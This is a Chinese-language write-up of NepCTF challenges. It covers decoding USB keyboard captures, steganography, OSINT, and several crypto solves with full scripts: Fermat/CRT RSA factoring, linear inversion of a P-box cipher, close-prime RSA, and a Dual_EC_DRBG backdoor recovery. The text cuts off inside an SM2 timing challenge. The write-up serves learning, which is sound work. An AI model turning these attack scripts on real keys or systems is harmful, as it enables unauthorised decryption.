&quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;, &quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;output = []keys = open(&#x27;out.txt&#x27;)for line in keys: try: if line[0]!=&#x27;0&#x27; or (line[1]!=&#x27;0&#x27; and line[1]!=&#x27;2&#x27;) or line[3]!=&#x27;0&#x27; or line[4]!=&#x27;0&#x27; or line[9]!=&#x27;0&#x27; or line[10]!=&#x27;0&#x27; or line[12]!=&#x27;0&#x27; or line[13]!=&#x27;0&#x27; or line[15]!=&#x27;0&#x27; or line[16]!=&#x27;0&#x27; or line[18]!=&#x27;0&#x27; or line[19]!=&#x27;0&#x27; or line[21]!=&#x27;0&#x27; or line[22]!=&#x27;0&#x27; or line[6:8]==&quot;00&quot;: continue if line[6:8] in normalKeys.keys(): output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#x27;2&#x27;] else: output += [&#x27;[unknown]&#x27;] except: passkeys.close()flag=0print(&quot;&quot;.join(output))for i in range(len(output)): try: a=output.index(&#x27;&lt;DEL&gt;&#x27;) del output[a] del output[a-1] except: passfor i in range(len(output)): try: if output[i]==&quot;&lt;CAP&gt;&quot;: flag+=1 output.pop(i) if flag==2: flag=0 if flag!=0: output[i]=output[i].upper() except: passprint (&#x27;output :&#x27; + &quot;&quot;.join(output)) 得到 welcometonepctf2nd，加分隔符得flag：nepctf&#123;welcome_to_nepctf_2nd&#125;。 ​ 花花画画画花花 花花画了一张图，你能看出来她画的是什么吗 (flag格式为NepCTF{}) 在 osu! wiki 可以发现osz文件为可执行的osu!谱面文件，下载安装osu!， 根据 生成的 .osz 文件会被放置在 osu! 文件夹下的 &quot;Exports&quot; 文件夹里，将osz文件放入 Exports 文件夹，打开osu!， 在Edit页面看完整首歌曲的乐谱轨迹，拿到flag：NepCTF&#123;MASTER_OF_坏女人！&#125;。 ​ 少见的bbbbase 少见的bbbbase 尝试几种常见jpg隐写，发现是jphide隐写，用JPHS工具seek（无密码），得到 KkYWdvCQcLYewSUUy5TtQc9AMa base58解得flag：flag&#123;Real_qiandao~&#125;。 ​ 9点直播 各位同学，比赛已经开始将近十个小时啦，大家玩的如何呢？邀请大家9点来直播间聊聊天~ 请锁定https://b23.tv/bn0pPAR这边小助手收到了大家想暴打出题人的反馈，今晚9点我们请到了变态的出题人们，在直播间和大家交流，放出我们的hint，帮助大家解题。同时也会在直播间中抽幸运的小伙伴送出我们的周边礼品。 看B站直播拿flag：NepCTF&#123;bad_woman_nb!&#125;。 ​ 馅饼？陷阱！ 好兄弟中奖了，但是要先汇款。他去哪了？ NepCTF{银行官网网址} OSINT题。 用Yandex识别图1里的黄色建筑，可得到结果为豪威海景大酒店，再在百度地图里搜索在海南三亚，附近银行为光大银行， 官网网址即flag：NepCTF&#123;www.cebbank.com&#125;。 ​ 问卷 https://www.wjx.cn/vm/mjlLAVV.aspx 答问卷暴打出题人，拿flag：NepCTF&#123;see_you_NepCTF_2023&#125;。 ​ CRYPTOsignin 本题flag格式: NepCTF{xxx} Have you heard of the Chinese Remainder Theorem? 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from Crypto.Util.number import getStrongPrime,bytes_to_longfrom gmpy2 import powmod,is_prime,invert,bit_length, next_primefrom FLAG import flagdef gen_key(): (p,q,n,e,d) = (0 for _ in range(5)) p = getStrongPrime(1024) q = next_prime(p)# q = p + 1# while(True):# q += 2 if q &amp; 1 else 1# if is_prime(q, 30):# break n = p*q e = 0x10001 d = invert(e, (p-1)*(q-1)) par = (p,q,n,e,d) return pardef leak(par, c): assert len(par) == 5 (p,q,n,e,d) = par print(&quot;Here&#x27;s something for you.&quot;) print(&quot;n =&quot;,n) print(&quot;e =&quot;,e) print(&quot;c_mod_p =&quot;,c % p) print(&quot;c_mod_q =&quot;,c % q)def enc(message, par): assert len(par) == 5 (p,q,n,e,d) = par m = bytes_to_long(message) c = powmod(m,e,n) return cif __name__ == &#x27;__main__&#x27;: par = gen_key() c = enc(flag, par) leak(par, c)&quot;&quot;&quot;Here&#x27;s something for you.n = 19955580242010925349026385826277356862322608500430230515928936214328341334162349408990409245298441768036250429913772953915537485025323789254947881868366911379717813713406996010824562645958646441589124825897348626601466594149743648589703323284919806371555688798726766034226044561171215392728880842964598154362131942585577722616354074267803330013886538511795383890371097812191816934883393255463554256887559394146851379087386846398690114807642170885445050850978579391063585254346364297374019309370189128443081285875218288166996242359495992824824109894071316525623741755423467173894812627595135675814789191820979950786791e = 65537c_mod_p = 32087476819370469840242617415402189007173583393431940289526096277088796498999849060235750455260897143027010566292541554247738211165214410052782944239055659645055068913404216441100218886028415095562520911677409842046139862877354601487378542714918065194110094824176055917454013488494374453496445104680546085816c_mod_q = 59525076096565721328350936302014853798695106815890830036017737946936659488345231377005951566231961079087016626410792549096788255680730275579842963019533111895111371299157077454009624496993522735647049730706272867590368692485377454608513865895352910757518148630781337674813729235453169946609851250274688614922&quot;&quot;&quot; 费马分解和CRT应用。 123456789101112131415161718# Sageimport gmpy2n =q = gmpy2.iroot(n,2)[0]while 1: q = gmpy2.next_prime(q) if n%q == 0: breakp = n//qcp =cq =e = 65537c = crt([cp,cq],[p,q])d = inverse_mod(e,(p-1)*(q-1))m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;NepCTF&#123;ju5t_d0_f4ct_4nd_crt_th3n_d3crypt&#125;&#x27; ​ p or s 本题flag格式: flag{xxx} what are the differences between P and S？ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from secret import keysfrom Crypto.Util.number import *assert(len(keys)==6)Pbox=[[0, 3, 6, 9, 10, 11, 13, 16, 18, 19, 20, 24, 25, 27, 28, 29, 30, 31],[0, 1, 3, 8, 9, 11, 12, 14, 16, 18, 19, 23, 24, 25, 26, 28, 29],[0, 1, 2, 3, 9, 10, 11, 13, 19, 20, 22, 25, 27, 28, 29, 31],[0, 2, 3, 5, 6, 7, 8, 13, 16, 19, 21, 25, 26, 27, 28],[2, 4, 6, 7, 9, 11, 12, 13, 16, 17, 20, 21, 22, 23, 24, 25, 27, 31],[2, 10, 13, 15, 16, 17, 21, 22, 23, 24, 29, 31],[1, 2, 8, 11, 12, 13, 16, 17, 19, 21, 22, 24, 25, 26, 27, 28, 30, 31],[0, 3, 6, 13, 14, 17, 19, 21, 22, 23, 26, 27, 28],[1, 5, 7, 8, 11, 12, 14, 15, 19, 23, 25, 27, 31],[0, 2, 3, 6, 7, 8, 9, 10, 11, 12, 16, 18, 19, 22, 23, 24, 25, 26, 27, 28],[0, 1, 6, 7, 10, 15, 16, 21, 24, 25, 29, 30],[1, 4, 5, 6, 7, 12, 13, 15, 18, 19, 20, 22, 26, 27, 29, 31],[0, 3, 5, 8, 9, 17, 21, 22, 24, 25, 26, 27, 30],[0, 2, 3, 4, 5, 6, 7, 8, 11, 17, 19, 20, 24, 25, 26, 27, 30],[2, 6, 7, 8, 11, 12, 14, 16, 20, 21, 22, 24, 29, 30, 31],[0, 2, 5, 6, 7, 8, 9, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 29, 31],[0, 1, 2, 3, 4, 5, 8, 10, 11, 12, 13, 16, 17, 18, 20, 21, 22, 23, 25, 26, 28, 29, 30],[3, 5, 6, 8, 10, 13, 14, 17, 19, 20, 21, 22, 24, 26, 27, 29, 30],[1, 3, 6, 12, 14, 15, 16, 17, 18, 21, 24, 25, 26, 27, 28],[0, 1, 2, 3, 5, 6, 7, 8, 9, 12, 13, 19, 20, 23, 26, 29, 30],[3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 20, 21, 22, 25, 26, 27, 28, 29, 30],[0, 1, 2, 4, 6, 7, 9, 10, 11, 13, 15, 16, 18, 19, 20, 21, 25, 31],[0, 2, 7, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 29, 31],[1, 2, 3, 5, 7, 8, 18, 19, 21, 22, 23, 25, 31],[3, 4, 7, 8, 10, 11, 13, 14, 17, 18, 19, 21, 22, 23, 24, 28, 29],[0, 2, 6, 7, 8, 10, 11, 12, 13, 16, 18, 19, 21, 23, 31],[0, 1, 3, 4, 8, 13, 14, 16, 18, 19, 21, 26, 27, 30, 31],[5, 6, 7, 9, 13, 14, 15, 18, 19, 20, 21, 24, 25, 28],[1, 3, 4, 5, 6, 7, 11, 14, 16, 17, 19, 20, 21, 22, 23, 25, 30, 31],[2, 3, 4, 6, 7, 11, 13, 17, 18, 19, 20, 23, 24, 25, 26, 28, 29, 30, 31],[0, 1, 2, 3, 4, 7, 9, 10, 13, 15, 16, 19, 22, 23, 24, 25, 27],[0, 1, 3, 4, 12, 16, 18, 19, 26, 30]]def enc(v): t=v for i in keys: q=[] for j in Pbox: q.append(sum([t[k] for k in j])%2) t=[int(q[j])^int(i[j]) for j in range(32)] return tassert(len(flag)==32)fb=bin(bytes_to_long(flag))[2:].zfill(32*8)ciphertext=&quot;&quot;for i in range(0,len(fb),32): t=enc([int(j) for j in fb[i:i+32]]) ciphertext+=&quot;&quot;.join([str(j) for j in t])print(ciphertext)&quot;&quot;&quot;0111110000100101000001101011110111101100000010110011101111000101111110111111100100100010001011000101000110110011111101000001001000000101111000001110001111001001100100111000011011101111111101001011100000100100110011111101100111001100111111110001111011101100&quot;&quot;&quot; 代码逻辑：将flag二进制32*8位01串分为8组，每一组都先经过P盒按位选择求和运算，再与未知的32位key进行按位异或运算，因为有6组key，上述两步运算循环进行6次操作，得到最终32位密文。 将加密过程转为 $\\text{GF}(2)$ 下的矩阵运算，$M_i$ 为 1x32 明文矩阵 $(0 \\le i \\lt 8)$，$P$ 为 32x32 P盒矩阵，$K_i$ 为 1x32 key矩阵 $(0 \\le i \\lt 6)$，$T_i$ 为中间矩阵 $(0 \\le i \\lt 6)$，$C$ 为密文矩阵，即： $T_0=M_i$ $T_1=T_0P^{-1}+K_0$ $T_2=T_1P^{-1}+K_1$ $T_3=T_2P^{-1}+K_2$ $T_4=T_3P^{-1}+K_3$ $T_5=T_4P^{-1}+K_4$ $T_6=T_5P^{-1}+K_5=C$ 可得： $C=T_6=M_i(P^{-1})^{6}+K_0(P^{-1})^{5}+K_1(P^{-1})^{4}+K_2(P^{-1})^{3}+K_3(P^{-1})^{2}+K_4P^{-1}+K_5$ 由于 $K_i$ 和 $P$ 都固定，令 $A=(P^{-1})^{6},B=K_0(P^{-1})^{5}+K_1(P^{-1})^{4}+K_2(P^{-1})^{3}+K_3(P^{-1})^{2}+K_4P^{-1}+K_5$， 有 $C=M_iA+B$，其中 $A,B$ 都为固定值，$A$ 可求，$B$ 未知。 猜测 $M_0$ 对应的明文是 flag，则由 $M_0,C_0$可以得出 $B$，再对 $C_1$ 至 $C_5$ 分别求逆运算可得 $M_1$ 至 $M_5$。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# SageP = [[0, 3, 6, 9, 10, 11, 13, 16, 18, 19, 20, 24, 25, 27, 28, 29, 30, 31],[0, 1, 3, 8, 9, 11, 12, 14, 16, 18, 19, 23, 24, 25, 26, 28, 29],[0, 1, 2, 3, 9, 10, 11, 13, 19, 20, 22, 25, 27, 28, 29, 31],[0, 2, 3, 5, 6, 7, 8, 13, 16, 19, 21, 25, 26, 27, 28],[2, 4, 6, 7, 9, 11, 12, 13, 16, 17, 20, 21, 22, 23, 24, 25, 27, 31],[2, 10, 13, 15, 16, 17, 21, 22, 23, 24, 29, 31],[1, 2, 8, 11, 12, 13, 16, 17, 19, 21, 22, 24, 25, 26, 27, 28, 30, 31],[0, 3, 6, 13, 14, 17, 19, 21, 22, 23, 26, 27, 28],[1, 5, 7, 8, 11, 12, 14, 15, 19, 23, 25, 27, 31],[0, 2, 3, 6, 7, 8, 9, 10, 11, 12, 16, 18, 19, 22, 23, 24, 25, 26, 27, 28],[0, 1, 6, 7, 10, 15, 16, 21, 24, 25, 29, 30],[1, 4, 5, 6, 7, 12, 13, 15, 18, 19, 20, 22, 26, 27, 29, 31],[0, 3, 5, 8, 9, 17, 21, 22, 24, 25, 26, 27, 30],[0, 2, 3, 4, 5, 6, 7, 8, 11, 17, 19, 20, 24, 25, 26, 27, 30],[2, 6, 7, 8, 11, 12, 14, 16, 20, 21, 22, 24, 29, 30, 31],[0, 2, 5, 6, 7, 8, 9, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 29, 31],[0, 1, 2, 3, 4, 5, 8, 10, 11, 12, 13, 16, 17, 18, 20, 21, 22, 23, 25, 26, 28, 29, 30],[3, 5, 6, 8, 10, 13, 14, 17, 19, 20, 21, 22, 24, 26, 27, 29, 30],[1, 3, 6, 12, 14, 15, 16, 17, 18, 21, 24, 25, 26, 27, 28],[0, 1, 2, 3, 5, 6, 7, 8, 9, 12, 13, 19, 20, 23, 26, 29, 30],[3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 20, 21, 22, 25, 26, 27, 28, 29, 30],[0, 1, 2, 4, 6, 7, 9, 10, 11, 13, 15, 16, 18, 19, 20, 21, 25, 31],[0, 2, 7, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 29, 31],[1, 2, 3, 5, 7, 8, 18, 19, 21, 22, 23, 25, 31],[3, 4, 7, 8, 10, 11, 13, 14, 17, 18, 19, 21, 22, 23, 24, 28, 29],[0, 2, 6, 7, 8, 10, 11, 12, 13, 16, 18, 19, 21, 23, 31],[0, 1, 3, 4, 8, 13, 14, 16, 18, 19, 21, 26, 27, 30, 31],[5, 6, 7, 9, 13, 14, 15, 18, 19, 20, 21, 24, 25, 28],[1, 3, 4, 5, 6, 7, 11, 14, 16, 17, 19, 20, 21, 22, 23, 25, 30, 31],[2, 3, 4, 6, 7, 11, 13, 17, 18, 19, 20, 23, 24, 25, 26, 28, 29, 30, 31],[0, 1, 2, 3, 4, 7, 9, 10, 13, 15, 16, 19, 22, 23, 24, 25, 27],[0, 1, 3, 4, 12, 16, 18, 19, 26, 30]]PP = zero_matrix(GF(2),32)for k in range(32): PP[k] = [1 if x in P[k] else 0 for x in range(32)]PPt = PP.transpose()c = &#x27;0111110000100101000001101011110111101100000010110011101111000101111110111111100100100010001011000101000110110011111101000001001000000101111000001110001111001001100100111000011011101111111101001011100000100100110011111101100111001100111111110001111011101100&#x27;C = zero_matrix(GF(2),8,32)for k in range(0,len(c),32): C[k//32] = [1 if x == &#x27;1&#x27; else 0 for x in c[k:k+32]]print(C)f0 = vector(GF(2),list(bin(int(b&#x27;flag&#x27;.hex(),16))[2:].zfill(4*8)))flag = b&#x27;flag&#x27;tmp = C[0] - (f0*(PPt^6))print(tmp)for k in range(1,8): l = list((C[k]-tmp)*PPt^(-6)) flag += bytes.fromhex(hex(int(&#x27;&#x27;.join([str(i) for i in l]),2))[2:]) print(flag)# b&#x27;flag&#123;P_has_no_Semantic_Security&#125;&#x27; ​ 中学数学 本题flag格式: flag{xxx} Zuni: 听说密码学是小学数学来着？ // 随缘评：真的吗 123456789101112131415161718192021from gmpy2 import *from Crypto.Util.number import *from secret import flagp=getPrime(1024)q=next_prime(p+(p&gt;&gt;500))e=0x10001n=p*qc=pow(bytes_to_long(flag),e,n)print(&quot;n=&quot;,n)print(&quot;c=&quot;,c)&#x27;&#x27;&#x27;n= 13776679754786305830793674359562910178503525293501875259698297791987196248336062506951151345232816992904634767521007443634017633687862289928715870204388479258679577315915061740028494078672493226329115247979108035669870651598111762906959057540508657823948600824548819666985698501483261504641066030188603032714383272686110228221709062681957025702835354151145335986966796484545336983392388743498515384930244837403932600464428196236533563039992819408281355416477094656741439388971695931526610641826910750926961557362454734732247864647404836037293509009829775634926600458845832805085222154851310850740227722601054242115507c= 6253975396639688013947622483271226838902346034187241970785550830715516801386404802832796746428068354515287579293520381463797045055114065533348514688044281004266071342722261719304097175009672596062130939189624163728328429608123325223000160428261082507446604698345173189268359115612698883860396660563679801383563588818099088505120717238037463747828729693649297904035253985982099474025883550074375828799938384533606092448272306356003096283602697757642323962299153853559914553690456801745940925602411053578841756504799815771173679267389055390097241148454899265156705442028845650177138185876173539754631720573266723359186&#x27;&#x27;&#x27; $p,q$ 接近，且前1024-500位相同，有 $\\sqrt{n}&gt;&gt;500 \\approx p&gt;&gt;500 \\approx q-p$，故可爆破找差值 $k$： 1234567891011121314151617181920212223242526272829303132# Sageimport gmpy2import itertoolsfrom tqdm import *def solve(f1, f2): g = f1.resultant(f2, q) roots = g.univariate_polynomial().roots() if len(roots) == 0: return False p_ = abs(roots[0][0]) q_ = abs(roots[1][0]) return (min(p_, q_), max(p_, q_))n = c = e = 65537x = int(gmpy2.iroot(n,2)[0])xh = x &gt;&gt; 500for k in trange(1000000,10000000): d = xh - k P.&lt;p, q&gt; = PolynomialRing(ZZ) f1 = n - p*q f2 = d - (q - p) res = solve(f1, f2) if res: print(k) print(res) break # 5476332# (117374101720892014802773132009595684550070475491812959407700503409964134408139790074777009067182443277766119990724185784535299405313567262727445965171074427891089886767667348073044876487630536209840494632852807000951512126317010773423294553929289375585831391437922887752426888245829185481732564145862194694837, 117374101720892014802773132009595684550070475491812959407700503409964134408139790074777009067182443277766119990724185784535299405313567262727445965171110284932237912222026220958706260216927350725324469350893507592837055161338352274913301924684983498346654165295930055956026431077232360603315231271970883987911) 再常规解： 1234567891011p = q = n = c = e = 65537f = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;flag&#123;never_ignore_basic_math&#125;&#x27; ​ bd_key 本题flag格式: NepCTF{xxx} master of pwn一下就解出了明文，因为有后门（本题与pwn无关） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138from Crypto.Util.number import long_to_bytes, bytes_to_long, getPrimefrom FLAG import flag&quot;&quot;&quot; Note: I have modified Dual_EC a little bit. It would be EASIER for you to exploit it.&quot;&quot;&quot;class Dual_EC(): def __init__(self, s_0=None): from Crypto.Util.number import getRandomNBitInteger # Init curve P-256 self.p = 115792089210356248762697446949407573530086143415290314195533631308867097853951 self.n = 115792089210356248762697446949407573529996955224135760342422259061068512044369 self.b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b self.curve = EllipticCurve(GF(self.p), [-3, self.b]) # Init P, Q self.Qx = 0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296 self.Qy = 0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5 self.Q = self.curve(self.Qx, self.Qy) self.d = getRandomNBitInteger(256) self.P = self.d * self.Q # Init state, h_adin if s_0 == None: self.s_i = int(floor((2^16-1)*random())) else: self.s_i = s_0 self.h_adin = 0 self.__leak_par() def __leak_par(self): print(f&quot;curve = &#123;self.curve&#125;&quot;) print(f&quot;P = &#123;self.P&#125;&quot;) print(f&quot;d = &#123;self.d&#125;&quot;) print(f&quot;Q = &#123;self.Q&#125;&quot;) # Output 32bytes now. def __Dual_EC_DRBG(self, h_adin = 0): t_i = self.s_i ^^ h_adin self.s_i = (t_i*self.P)[0].lift() r_i = (self.s_i*self.Q)[0].lift() return r_i def getRandomNBytes(self, N:int) -&gt; bytes: result = 0 req = (N/32).ceil() for i in range(req): if(i == 0): result = (result &lt;&lt; (32*8)) | self.__Dual_EC_DRBG(self.h_adin) else: result = (result &lt;&lt; (32*8)) | self.__Dual_EC_DRBG() self.s_i = (self.s_i * self.P)[0].lift() result = result &gt;&gt; ((32*req - N)*8) return long_to_bytes(result) def encrypt_flag(key:bytes) -&gt; bytes: from Crypto.Cipher import AES from Crypto.Util.Padding import pad from FLAG3 import flag cipher = AES.new(key, AES.MODE_ECB) flag_pad = pad(flag, 16) ct = cipher.encrypt(flag_pad) return ctdef do_schnorr_identification(dbrg): p = getPrime(256) Zp = Zmod(p) g = Zp(2) q = g.multiplicative_order() Zq = Zmod(q) k = 10 class SchnorrProver(object): def __init__(self): self.secret_key = Zq.random_element() self.public_key = g^self.secret_key def commit(self): self.r = Zq.random_element() return g^self.r def respond(self, challenge): return self.r - challenge*self.secret_key class SchnorrVerifier(object): def __init__(self, prover_public_key): self.prover_public_key = prover_public_key def challenge(self, commitment): self.commitment = commitment while True: c = bytes_to_long(dbrg.getRandomNBytes(32)) if c &lt; p: break self.challenge_number = c return self.challenge_number def check(self, response): check_value = g^response*self.prover_public_key^self.challenge_number return self.commitment == check_value def run_protocol(iterations=1): for _ in range(iterations): prover = SchnorrProver() verifier = SchnorrVerifier(prover.public_key) t = prover.commit() c = verifier.challenge(t) s = prover.respond(c) assert(verifier.check(s)) print(f&quot;c = &#123;c&#125;&quot;) run_protocol() def main(): dbrg = Dual_EC() do_schnorr_identification(dbrg) key = dbrg.getRandomNBytes(16) ct = encrypt_flag(key) print(f&quot;ct = &#123;bytes_to_long(ct)&#125;&quot;)main() 123456# curve = Elliptic Curve defined by y^2 = x^3 + 115792089210356248762697446949407573530086143415290314195533631308867097853948*x + 41058363725152142129326129780047268409114441015993725554835256314039467401291 over Finite Field of size 115792089210356248762697446949407573530086143415290314195533631308867097853951# P = (72696788778535848020209987825324097844942627382508830211685965810687985426258 : 49180397040468497821240854375656422791216946832858522054245540263375986110762 : 1)# d = 66604141534275704476445937214374130642068729921454877238730830814793201802544# Q = (48439561293906451759052585252797914202762949526041747995844080717082404635286 : 36134250956749795798585127919587881956611106672985015071877198253568414405109 : 1)# c = 59100197418944667413449341413044666843726352095054393072750502893110293231642# ct = 25645992443585671366815910836517434170297823176311632150463962979581372384075859802765045877741181123347569267185176 双椭圆曲线确定性随机数发生器（Dual_EC_DRBG）的一个后门，原理： 设每一步的 $\\text{state}$ 为 $s_i$，随机数为 $r_i$，随机数对应的椭圆曲线上的点为 $R_i$。 对于攻击者来说，已知 $P$、$Q$、$d$、$r_{i-1}$，而 $s_i$ 未知。于是有： $\\begin{cases} ((s_i \\cdot P)_x \\cdot P)_x &amp; \\rightarrow s_{i+1} \\newline ((s_i \\cdot P)_x \\cdot Q)_x &amp; \\rightarrow r_i \\end{cases}$ 后门为构造 $d \\cdot r_{i-1}$，其恰好是 $s_i$，看似安全的体制被攻破。 记 $k_i = (s_i \\cdot P)_x$，有： $\\begin{align} d \\cdot r_{i-1} &amp; = {(d \\cdot R_{i-1})_x = (d \\cdot k_{i-1} \\cdot Q)_x} = {(k_{i-1} \\cdot d \\cdot Q)_x = (k_{i-1} \\cdot P)_x} = {((s_{i-1} \\cdot P)_x \\cdot P)_x = s_i} \\end{align}$ 题里 $c=r_{i-1}$，构造 $d \\cdot c = s_i$，则可以推出下一个随机数 $r_i=((s_i \\cdot P)_x \\cdot Q)_x$，取高16*8位为AES的Key。 1234567891011121314151617181920212223242526272829# Sagefrom Crypto.Util.number import long_to_bytesfrom Crypto.Cipher import AESa = 115792089210356248762697446949407573530086143415290314195533631308867097853948b = 41058363725152142129326129780047268409114441015993725554835256314039467401291p = 115792089210356248762697446949407573530086143415290314195533631308867097853951E = EllipticCurve(GF(p),[a,b])n = 115792089210356248762697446949407573529996955224135760342422259061068512044369P = (72696788778535848020209987825324097844942627382508830211685965810687985426258, 49180397040468497821240854375656422791216946832858522054245540263375986110762)d = 66604141534275704476445937214374130642068729921454877238730830814793201802544Q = (48439561293906451759052585252797914202762949526041747995844080717082404635286, 36134250956749795798585127919587881956611106672985015071877198253568414405109)c = 59100197418944667413449341413044666843726352095054393072750502893110293231642ct = 25645992443585671366815910836517434170297823176311632150463962979581372384075859802765045877741181123347569267185176P = E(P)Q = E(Q)R0 = E.lift_x(c)s1 = (d*R0)[0]s2 = ((s1*P)[0]*P)[0]r1 = ((s1*P)[0]*Q)[0]key = r1 &gt;&gt; ((32 - 16)*8)cipher = AES.new(key, AES.MODE_ECB)key = long_to_bytes(key)ct = long_to_bytes(ct)print(cipher.decrypt(ct))# b&#x27;NepCTF&#123;NS4_b4ckd00r_1n_ps3ud0_r4nd0m_g3n3r4t0r&#125;\\x01&#x27; ​ timing 牢不可破的算法，或许会在其他地方出现问题？(容器下发后，师傅自行nc哦～～～) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283#!/usr/bin/python3 from time import perf_counter_ns as clock1from time import *ecc_table = &#123; &#x27;n&#x27;: &#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123&#x27;, &#x27;p&#x27;: &#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF&#x27;, &#x27;g&#x27;: &#x27;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7&#x27; &#x27;bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0&#x27;, &#x27;a&#x27;: &#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC&#x27;, &#x27;b&#x27;: &#x27;28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93&#x27;, &#x27;O&#x27;: &#x27;0000000000000000000000000000000000000000000000000000000000000000&#x27; &#x27;0000000000000000000000000000000000000000000000000000000000000000&#x27;,&#125;class TSM2(object): def __init__(self, sk): self.ecc_table = ecc_table self.n = int(ecc_table[&#x27;n&#x27;], 16) self.para_len = len(ecc_table[&#x27;n&#x27;]) self.ecc_a3 = (int(ecc_table[&#x27;a&#x27;], base=16) + 3) % int(ecc_table[&#x27;p&#x27;], base=16) self.sk = sk self.pk = self.kg(self.sk, ecc_table[&#x27;g&#x27;]) def sign(self, data, K): e = data d = self.sk k = K P1 = self.kg(k, self.ecc_table[&#x27;g&#x27;]) x = int(P1[0:self.para_len], 16) R = ((e + x) % int(self.ecc_table[&#x27;n&#x27;], base=16)) if R == 0 or R + k == int(self.ecc_table[&#x27;n&#x27;], base=16): return None d_1 = pow( d+1, int(self.ecc_table[&#x27;n&#x27;], base=16) - 2, int(self.ecc_table[&#x27;n&#x27;], base=16)) S = (d_1*(k + R) - R) % int(self.ecc_table[&#x27;n&#x27;], base=16) if S == 0: return None else: return &#x27;%064x%064x&#x27; % (R, S) def verify(self, Sign, data): r = int(Sign[0:self.para_len], 16) s = int(Sign[self.para_len:2 * self.para_len], 16) e = int(data.hex(), 16) t = (r + s) % self.n if t == 0: return 0 P1 = self.kg(s, self.ecc_table[&#x27;g&#x27;]) P2 = self.kg(t, self.pk) if P1 == P2: P1 = &#x27;%s%s&#x27; % (P1, 1) P1 = self._double_point(P1) else: P1 = &#x27;%s%s&#x27; % (P1, 1) P1 = self._add_point(P1, P2) P1 = self._convert_jacb_to_nor(P1) x = int(P1[0:self.para_len], 16) return r == ((e + x) % self.n) def kg(self, k, Point): k=k%self.n if k == 0: return &#x27;0&#x27; * 128 Point = &#x27;%s%s&#x27; % (Point, &#x27;1&#x27;) mask_str = &#x27;8&#x27; for i in range(self.para_len - 1): mask_str += &#x27;0&#x27; mask = int(mask_str, 16) Temp = Point flag = False for n in range(self.para_len * 4): if flag: Temp = self._double_point(Temp) if (k &amp; mask) != 0: if flag: Temp = self._add_point(Temp, Point) else: flag = True Temp = Point k = k &lt;&lt; 1 return self._convert_jacb_to_nor(Temp) def _double_point(self, Point): t1=clock1() l = len(Point) len_2 = 2 * self.para_len if l &lt; self.para_len * 2: return None else: x1 = int(Point[0:self.para_len], 16) y1 = int(Point[self.para_len:len_2], 16) if l == len_2: z1 = 1 else: z1 = int(Point[len_2:], 16) T6 = (z1 * z1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T2 = (y1 * y1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (x1 + T6) % int(self.ecc_table[&#x27;p&#x27;], base=16) T4 = (x1 - T6) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T3 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (y1 * z1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T4 = (T2 * 8) % int(self.ecc_table[&#x27;p&#x27;], base=16) T5 = (x1 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T1 * 3) % int(self.ecc_table[&#x27;p&#x27;], base=16) T6 = (T6 * T6) % int(self.ecc_table[&#x27;p&#x27;], base=16) T6 = (self.ecc_a3 * T6) % int(self.ecc_table[&#x27;p&#x27;], base=16) T1 = (T1 + T6) % int(self.ecc_table[&#x27;p&#x27;], base=16) z3 = (T3 + T3) % int(self.ecc_table[&#x27;p&#x27;], base=16) T3 = (T1 * T1) % int(self.ecc_table[&#x27;p&#x27;], base=16) T2 = (T2 * T4) % int(self.ecc_table[&#x27;p&#x27;], base=16) x3 = (T3 - T5) % 